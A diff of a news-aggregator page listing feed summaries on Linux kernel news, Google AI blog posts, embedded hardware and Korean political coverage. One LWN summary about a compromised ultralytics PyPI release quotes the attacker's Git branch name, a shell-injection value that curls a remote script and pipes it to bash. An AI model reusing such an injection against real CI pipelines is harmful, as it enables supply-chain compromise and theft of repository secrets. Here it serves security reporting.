@@ -22,8 +22,8 @@
             data-action="toggle-accordions"
             title="Click to toggle the day, Ctrl + click to toggle all."
           >
-            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2024-12-05 datetime="2024-12-05T20:18:23.876Z">2024-12-05</time>
-            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2024-12-05 datetime="2024-12-05T20:18:23.876Z"></time>
+            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2024-12-06 datetime="2024-12-06T20:17:59.644Z">2024-12-06</time>
+            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2024-12-06 datetime="2024-12-06T20:17:59.644Z"></time>
           </button>
         </h2>
         <ul class="sources card">
@@ -42,14 +42,14 @@
                       <details
                         class="article-expander"
                         data-action="toggle-native-accordion"
-                        data-accordion-key="https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/"
+                        data-accordion-key="https://developers.googleblog.com/en/looking-back-at-the-first-year-of-the-gemini-era/"
                         open
                       >
-                        <summary class="article-expander__title">Introducing PaliGemma 2: Powerful Vision-Language Models, Simple Fine-Tuning</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/">
+                        <summary class="article-expander__title">Looking back at the first year of the Gemini era</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://developers.googleblog.com/en/looking-back-at-the-first-year-of-the-gemini-era/">
                           <div class="article-summary-box-inner media-object">
                             <span class="media-object__text">
-                              <span>PaliGemma 2, the next evolution in tunable vision-language models, comes with new features such as scalable performance, long captioning, and expanded capabilities. Get started with pre-trained models, documentation, and tutorials.</span>
+                              <span>The range of family of Gemini models has expanded in the past year in response to developer needs, introducing faster and more cost-effective models, and enhancing tools in Google AI Studio.</span>
                             </span>
                           </div>
                         </a>
@@ -69,6 +69,345 @@
                   <a class="source-heading__link" href="https://lwn.net">Open</a>
                 </h3>
                 <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://lwn.net/Articles/1001215/"
+                        open
+                      >
+                        <summary class="article-expander__title">Abusing Git branch names to compromise a PyPI package</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/1001215/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.
+The GitHub account 
+
+&quot;OpenIM Robot&quot;
+(which appears to be controlled by
+Xinwei Xiong) opened
+a pull request for the 
+
+ultralytics
+Python package. The pull request included a suspicious Git branch name:
+
+
+
+openimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)
+
+
+
+Unfortunately, ultralytics uses the
+pull_request_target GitHub Action trigger to automate some of its continuous integration tasks. This runs a script from the base branch of the repository, which has access to the repository&#x27;s secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already pulled the malicious script.
+
+
+
+This problem has been
+known for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://lwn.net/Articles/1001202/"
+                        open
+                      >
+                        <summary class="article-expander__title">A single stable kernel to fix boot problems</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/1001202/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>Greg Kroah-Hartman released version
+6.12.3 of the kernel to fix
+
+a regression that can cause some machines to fail to boot on version 6.12.2.
+The other stable branches are continuing on their normal cadence, with
+
+6.12.4-rc1 and
+
+6.6.64-rc1 starting review today.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://lwn.net/Articles/1000654/"
+                        open
+                      >
+                        <summary class="article-expander__title">[$] Freezing out the page reference count</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/1000654/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>The page
+structure sits at the core of the kernel&#x27;s memory-management subsystem
+(for now), and a key part of that structure is its reference count, stored
+in refcount.  The page reference count tells the kernel how many
+users a given page has and when it can be freed.  That count is not needed
+for every page in the system, though.  Matthew Wilcox has recently resurrected
+an old
+patch set that expands the concept of a &quot;frozen&quot; page — one that lacks a
+meaningful reference count — to the immediate benefit of the slab allocator
+but in the service of a longer-term goal as well.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://lwn.net/Articles/1001164/"
+                        open
+                      >
+                        <summary class="article-expander__title">Security updates for Friday</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/1001164/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>Security updates have been issued by AlmaLinux (firefox, postgresql, postgresql:12, postgresql:13, postgresql:15, postgresql:16, python3:3.6.8, and thunderbird), Debian (clamav), Fedora (pam), Red Hat (firefox, postgresql:13, postgresql:15, python-tornado, redis:7, ruby, ruby:2.5, and ruby:3.1), SUSE (avahi, docker-stable, java-1_8_0-openjdk, libmozjs-128-0, obs-scm-bridge, php8, and teleport), and Ubuntu (ghostscript, needrestart, and shiro).</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >Embedded</button>
+                  <a class="source-heading__link" href="https://www.embedded.com/">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://www.embedded.com/?p&#x3D;4492831"
+                        open
+                      >
+                        <summary class="article-expander__title">Portable Memory, BMS Open Wire Detection, Embedded Rust: Embedded Week Insights</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://www.embedded.com/portable-memory-bms-open-wire-detection-embedded-rust-embedded-week-insights/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>Here’s a RoundUp of this week’s must-read articles – we’ll delve into the latest developments on Portable Memory, BMS Open Wire Detection, and Embedded Rust! Also, check News Archives – Embedded and Technical Articles Archives – Embedded for the complete list of news and articles from our website. NEWS X-FAB Introduces Embedded Flash Solution Utilizing Its 110nm Automotive BCD-on-SOI […]
+The post Portable Memory, BMS Open Wire Detection, Embedded Rust: Embedded Week Insights appeared first on Embedded.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://www.embedded.com/?p&#x3D;4492343"
+                        open
+                      >
+                        <summary class="article-expander__title">Passive Component Selection Know-How for Hardware Design</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://www.embedded.com/passive-component-selection-know-how-for-hardware-design/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>Passive components don’t need an external power source and don’t increase or generate power; they use a small amount of energy. In contrast, active components require a power source, like a battery, to increase the power of signals. Examples of passive components include resistors, capacitors, and inductors while transistors and integrated circuits (ICs) are active […]
+The post Passive Component Selection Know-How for Hardware Design appeared first on Embedded.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >슬로우뉴스.</button>
+                  <a class="source-heading__link" href="https://slownews.kr">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://slownews.kr/?p&#x3D;122980"
+                        open
+                      >
+                        <summary class="article-expander__title">윤석열은 ‘계엄’이 뭔지도 몰랐다.</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122980">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>[최병천 칼럼] 명령 불복종한 군인들, 총 들고 설친다고 움츠려들 국민들이 아니다. 사태의 전말이 속속 드러나고 있다. 이번 사태에서 최대 미스터리는 윤석열이 도대체 왜 무엇을 얻고자 비상계엄을 선포했는지다. 헌법 제77조에 의하면, 국회 과반이 의결하면 계엄이 해제된다. 윤석열도 그걸 모르진 않았을텐데 강행했다. 목표가 무엇이었는지, 왜 계엄이라는 ‘수단’을 사용했는지, 도무지 풀리지 않는 의문이었다. 이처럼 어마어마한 사태를 일으켰으면, 분명...
+The post 윤석열은 ‘계엄’이 뭔지도 몰랐다. appeared first on 슬로우뉴스..</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://slownews.kr/?p&#x3D;122972"
+                        open
+                      >
+                        <summary class="article-expander__title">‘친위 쿠데타’ 실패, 윤석열 지지율 13%까지 떨어졌다.</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122972">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>[슬로우데이터] 이재명 지지율 역대 최고 수준, 한동훈은 급락. 윤석열(대통령) 지지율이 16%까지 추락했다. 부정 평가는 75%를 찍었다. 갤럽 정기 여론조사 결과다. 12월 3~5일까지 조사 결과라 일부는 비상계엄 여론이 반영되지 않았을 수 있다. (비상계엄 선포는 3일 저녁이었다.) 이게 왜 중요한가. 대구 경북도 12%뿐. 계엄 이후 지지율은 13%. 민주당 지지율은 급등. 이재명 지지율 압도적인 1위.
+The post ‘친위 쿠데타’ 실패, 윤석열 지지율 13%까지 떨어졌다. appeared first on 슬로우뉴스..</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >economic view</button>
+                  <a class="source-heading__link" href="http://economicview.net">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="http://economicview.net/?p&#x3D;85634"
+                        open
+                      >
+                        <summary class="article-expander__title">탄핵선진국 대한민국</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="http://economicview.net/85634/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>By Wei-Te Wong – https://www.flickr.com/photos/wongwt/27202724082/, CC BY-SA 2.0, Link 탄핵에 관한 남한의 경험은 매우 드문 장면이다. 내가 공동으로 저술한 최신 연구에 따르면 1990년과 2017년 사이에 전 세계적으로 탄핵이 성공한 것은 단지 열 번에 불과했다. 그러나 남한은 다른 이들이 따를만한 가치 있는 선례를 남겼다. 어떤 이는 민주적으로 선출한 지도자를 제거하는 것은 비민주적이라고 주장하기도 하지만 탄핵은 민주주의를 […]</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >꿈꾸는섬</button>
+                  <a class="source-heading__link" href="https://happist.com">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://happist.com/?p&#x3D;596833"
+                        open
+                      >
+                        <summary class="article-expander__title">2024년 쇼핑시즌 트렌드 시사점, 사이버먼데이 매출 최고치 기록</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://happist.com/596833/2024%eb%85%84-%ec%87%bc%ed%95%91%ec%8b%9c%ec%a6%8c-%ed%8a%b8%eb%a0%8c%eb%93%9c-%ec%8b%9c%ec%82%ac%ec%a0%90-%ec%82%ac%ec%9d%b4%eb%b2%84%eb%a8%bc%eb%8d%b0%ec%9d%b4-%eb%a7%a4%ec%b6%9c-%ec%b5%9c%ea%b3%a0">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>미국 기준으로 2024년 쇼핑시즌이 막을 내리고 잇습니다. 아직 크리스마스 시즌이 남아 있기느 하지만 사이버먼데를 기점으로 중요한 쇼핑 시즌은 막을 내린것으로 보는게 맞을 것 같습니다. 이번 2024년 쇼핑시즌 트렌드 시사점에늠 무엇이 있을까요? 도널드 트럼프 대통령 당선인이 제안한 관세로 인해 물가가 급등하기 전에 미리 구매하려는 소비자들은 큰 폭의 할인 혜택을 누리고 고가 품목을 사재기했습니다. Adobe 애널리틱스에 따르면 […]</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+        </ul>
+      </section>
+      <section class="daily-content js-toggle-accordions-scope">
+        <h2 class="daily-heading">
+          <button
+            class="daily-heading-toggle"
+            data-action="toggle-accordions"
+            title="Click to toggle the day, Ctrl + click to toggle all."
+          >
+            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2024-12-05 datetime="2024-12-05T23:38:50.000Z">2024-12-05</time>
+            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2024-12-05 datetime="2024-12-05T23:38:50.000Z"></time>
+          </button>
+        </h2>
+        <ul class="sources card">
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >LWN.net</button>
+                  <a class="source-heading__link" href="https://lwn.net">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://lwn.net/Articles/1001013/"
+                        open
+                      >
+                        <summary class="article-expander__title">Apertis v2024 released</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/1001013/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>Apertis is a Collabora-developed
+Debian derivative distribution designed to be incorporated into electronic
+devices; the v2024
+release is now available.  It is now based on the Bookworm release, and
+includes support for Podman, ONNX
+Runtime, OP-TEE, and more.
+
+
+	Apertis relies on the Debian Free Software Guidelines to ensure all
+	software shipped is open source or, in limited cases, at least
+	freely distributable. However, for some customers this is not
+	enough to be able to adopt OSS solutions as in their evaluations
+	some provisions in common licenses like the GPL-3 are at odds with
+	regulatory constraints they are subject to. Apertis does not set to
+	solve this decades-long debate, and instead its goal is to increase
+	the adoption of modern, maintained OSS solutions in markets where
+	this has historically been a challenge. To enable this, Apertis
+	supports avoiding the use of any software under some licenses (like
+	the [GPL v3.0 license family) on target images, while still making
+	them fully available for development and for customers that do not
+	share those licensing concerns. To avoid these licenses, Apertis
+	uses more modern alternatives instead of relying on outdated and
+	unmaintained pre-GPL-3 versions. For instance, coreutils and
+	findutils (GPL-3+) are replaced in Apertis by rust-coreutils and
+	rust-findutils.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
                     <article>
                       <details
                         class="article-expander"
@@ -257,6 +596,105 @@ track, and many are sill unfixed in this kernel branch.</span>
                     class="source-heading__name"
                     data-action="toggle-accordions"
                     title="Click to toggle the source, Ctrl + click to toggle all."
+                  >슬로우뉴스.</button>
+                  <a class="source-heading__link" href="https://slownews.kr">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://slownews.kr/?p&#x3D;122952"
+                        open
+                      >
+                        <summary class="article-expander__title">윤석열 탄핵안 표결 D-1, 민주주의의 힘을 보여줄 때다: 슬로우레터 12월6일.</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122952">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>지금까지 확인된 사실. 윤석열 탄핵안 표결 D-1. 시간 문제일 뿐. 여론조사는 74%가 탄핵 찬성. 쟁점과 현안. “형편없는 오판(badly misjudged).” ‘아메리칸 파이’는 끝났다. “한국의 민주주의의 승리를 기대한다.” 계엄사령관 사표는 반려. 군 부대 국회 투입 누가 지시했나. “국민들께 너무 죄송했다.” 김용현이 지휘했다. 포고령은 누가 작성했나. 윤석열이 계엄사령부를 방문했다. 이상민이 실토한 진실. “경고성 계엄이었다.” 더 깊게 읽기. 계엄군이...
+The post 윤석열 탄핵안 표결 D-1, 민주주의의 힘을 보여줄 때다: 슬로우레터 12월6일. appeared first on 슬로우뉴스..</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://slownews.kr/?p&#x3D;122902"
+                        open
+                      >
+                        <summary class="article-expander__title">대통령이 술이 깰 때까지 기다리면 되는 것인가.</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122902">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>[신현호 칼럼] 닉슨에게는 키신저가 있었다… 윤석열은? 술 안 마실 때도 위험, 주변에는 동창생 클럽 뿐. 대통령이 술에 취해 적국을 폭격하라고 하면 어떤 일이 벌어질까? 쓸 데 없는 농담처럼 보이겠지만 이는 실제 있었던 일이고, 지금 우리가 걱정해야 하는 현실이다. “아침까지 기다려 봅시다.” 미국 CIA 고위급 인사인 조지 카버에 의하면 1969년 북한이 미국 정찰기를 격추했을 때, 술에...
+The post 대통령이 술이 깰 때까지 기다리면 되는 것인가. appeared first on 슬로우뉴스..</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://slownews.kr/?p&#x3D;122860"
+                        open
+                      >
+                        <summary class="article-expander__title">철도 파업, 진짜 불편한 건 방치된 공공성과 안전.</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122860">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>한국철도공사(코레일) 노동조합이 5일부터 무기한 총파업에 들어갔다. 평소 대비 60% 수준으로 운행 편수가 줄었다. 코레일은 인력 감축을 추진하고 있는데 노조는 인력 충원을 요구하고 있다. 접점을 찾기가 쉽지 않다. 서울교통공사 노조도 6일부터 파업에 들어갈 예정이다. 한국철도공사(코레일) 노조의 요구. 서울 지하철(서울교통공사) 노조의 요구. (지난해 9월12일에 업로드한 슬로우쇼츠 영상입니다.) 하루 이자만 10억 원. 철도 공공성이라는 오래된 화두. SRT 분할이라는...
+The post 철도 파업, 진짜 불편한 건 방치된 공공성과 안전. appeared first on 슬로우뉴스..</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >Google Developers Blog</button>
+                  <a class="source-heading__link" href="https://developers.googleblog.com/rss/">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/"
+                        open
+                      >
+                        <summary class="article-expander__title">Introducing PaliGemma 2: Powerful Vision-Language Models, Simple Fine-Tuning</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>PaliGemma 2, the next evolution in tunable vision-language models, comes with new features such as scalable performance, long captioning, and expanded capabilities. Get started with pre-trained models, documentation, and tutorials.</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
                   >꿈꾸는섬</button>
                   <a class="source-heading__link" href="https://happist.com">Open</a>
                 </h3>
@@ -321,56 +759,6 @@ track, and many are sill unfixed in this kernel branch.</span>
                           <div class="article-summary-box-inner media-object">
                             <span class="media-object__text">
                               <span>I am very sceptical when I hear the term “graphical interface”. All too often I have been frustrated and irritated by a webpage with flashing, animated GIFs or by a “user friendly” interface on a device that takes for ever performing somersaults and cartwheels instead of letting me get on with the task in hand. Of course, these are examples of badly designed graphical interfaces. I...</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >슬로우뉴스.</button>
-                  <a class="source-heading__link" href="https://slownews.kr">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://slownews.kr/?p&#x3D;122902"
-                        open
-                      >
-                        <summary class="article-expander__title">대통령이 술이 깰 때까지 기다리면 되는 것인가.</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122902">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>[신현호 칼럼] 닉슨에게는 키신저가 있었다… 윤석열은? 술 안 마실 때도 위험, 주변에는 동창생 클럽 뿐. 대통령이 술에 취해 적국을 폭격하라고 하면 어떤 일이 벌어질까? 쓸 데 없는 농담처럼 보이겠지만 이는 실제 있었던 일이고, 지금 우리가 걱정해야 하는 현실이다. “아침까지 기다려 봅시다.” 미국 CIA 고위급 인사인 조지 카버에 의하면 1969년 북한이 미국 정찰기를 격추했을 때, 술에...
-The post 대통령이 술이 깰 때까지 기다리면 되는 것인가. appeared first on 슬로우뉴스..</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://slownews.kr/?p&#x3D;122860"
-                        open
-                      >
-                        <summary class="article-expander__title">철도 파업, 진짜 불편한 건 방치된 공공성과 안전.</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/122860">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>한국철도공사(코레일) 노동조합이 5일부터 무기한 총파업에 들어갔다. 평소 대비 60% 수준으로 운행 편수가 줄었다. 코레일은 인력 감축을 추진하고 있는데 노조는 인력 충원을 요구하고 있다. 접점을 찾기가 쉽지 않다. 서울교통공사 노조도 6일부터 파업에 들어갈 예정이다. 한국철도공사(코레일) 노조의 요구. 서울 지하철(서울교통공사) 노조의 요구. (지난해 9월12일에 업로드한 슬로우쇼츠 영상입니다.) 하루 이자만 10억 원. 철도 공공성이라는 오래된 화두. SRT 분할이라는...
-The post 철도 파업, 진짜 불편한 건 방치된 공공성과 안전. appeared first on 슬로우뉴스..</span>
                             </span>
                           </div>
                         </a>
@@ -9956,42 +10344,6 @@ The post 윤석열의 자백? 채 상병 사건 문제의 통화, 김건희가 �
                         </a>
                       </details>
                     </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://slownews.kr/?p&#x3D;120732"
-                        open
-                      >
-                        <summary class="article-expander__title">“순진한 아내를 악마화”, 마지막 반전 기회를 걷어찼다.</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/120732">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>임기 전반을 며칠 남겨둔 시점에서 오늘 대국민 담화는 윤석열 정부의 남은 2년 반을 결정할 중요한 이벤트였다. 언론의 요구는 크게 세 가지였다. 최악의 선택. 거짓말을 덮는 거짓말. 윤석열이 자백한 국정농단 정황. 부산일보 기자의 질문. 무엇을 사과한다는 건가. 다음은 오늘 기자회견의 주요 발언을 정리한 것이다. 모두 발언. 나와 정부의 부족했던 부분을 잘 알고 있다. 고쳐야 할 부분들을...
-The post “순진한 아내를 악마화”, 마지막 반전 기회를 걷어찼다. appeared first on 슬로우뉴스..</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://slownews.kr/?p&#x3D;113278"
-                        open
-                      >
-                        <summary class="article-expander__title">AI와 기후위기: 온실가스 감축 vs. 전기 먹는 하마</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/113278">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>지난 2년 동안 오픈AI가 불러일으킨 생성형 인공지능 열풍이 드디어 기후 대응 영역에서도 파란을 일으키기 시작했다. 사회경제적으로 온갖 낙관과 기대를 불러일으켜 온 인공지능 붐이 온실가스 감축과 기후 재난 대비에도 획기적으로 기여할 수 있다는 전망이 쏟아지는 것이다. 온실가스 감축 vs. 전기 먹는 하마 인공지능 단백질 구조 예측 모델 ‘알파폴드’를 개발해 노벨 화학상을 받은 데미스 허사비스(Demis Hassabis)는 이미...
-The post AI와 기후위기: 온실가스 감축 vs. 전기 먹는 하마 appeared first on 슬로우뉴스..</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
                 </section>
               </section>
             </li>
@@ -10179,23 +10531,6 @@ features are trying to get a handle on struct sockaddr.</span>
                         </a>
                       </details>
                     </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://lwn.net/Articles/996377/"
-                        open
-                      >
-                        <summary class="article-expander__title">[$] LWN.net Weekly Edition for November 7, 2024</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/996377/">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>The LWN.net Weekly Edition for November 7, 2024 is available.</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
                 </section>
               </section>
             </li>
@@ -10261,92 +10596,6 @@ features are trying to get a handle on struct sockaddr.</span>
                 </section>
               </section>
             </li>
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >Red Hat Developer</button>
-                  <a class="source-heading__link" href="https://developers.redhat.com/">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="a9b95a09-f63d-48b9-b29e-802929b39f07"
-                        open
-                      >
-                        <summary class="article-expander__title">How to track file descriptors with Valgrind</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://developers.redhat.com/articles/2024/11/07/track-file-descriptors-valgrind">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>This article describes the new file descriptor related features recently added to Valgrind and explains how to use them to track the file descriptors that your program is using or, more importantly, misusing. 
-Valgrind was able to track file descriptors for a while. But my colleague Mark Wielaard and I improved this feature and turned all file descriptor operations into events, which allowed Valgrind to create errors on misuse that can show where the operation occurred, made them suppressible, and can be reported in different formats.
-What is Valgrind?
-Valgrind is an instrumentation framework for building dynamic analysis tools. The tool can detect various memory management and threading bugs. To be able to detect the bugs, Valgrind decompiles, instruments, and recompiles your code to inte…</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="76a016dd-e6ef-4d49-a207-92e35bd265e0"
-                        open
-                      >
-                        <summary class="article-expander__title">Use bootc logically bound images to deploy a Kafka cluster</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://developers.redhat.com/articles/2024/11/07/use-bootc-logically-bound-images-deploy-kafka-cluster">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>Logically bound images are a recently added feature in bootc that allows any container image to be managed directly by bootc. One of the many benefits this provides is simplified system management. An application image can be &quot;bound&quot; to a bootc operating system image as part of the bootc container build.
